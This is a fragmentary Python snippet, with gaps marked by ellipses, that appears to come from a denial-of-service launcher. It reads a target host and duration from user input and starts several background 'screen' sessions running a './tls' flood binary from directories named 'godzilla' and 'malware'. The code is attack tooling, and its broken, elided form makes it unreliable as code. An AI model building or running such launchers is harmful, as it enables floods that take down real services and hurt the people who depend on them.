...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && screen -dm ./tls {host} {time} 500 8 5')
				os.system(f'cd malware && screen -dm ./tls {host} {time} 500 8 8')
				os.system(f'cd /media/ && screen -dm ./tls {host} {time} 500 8 5')
...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && screen -dm ./tls {host} {time} 500 2')
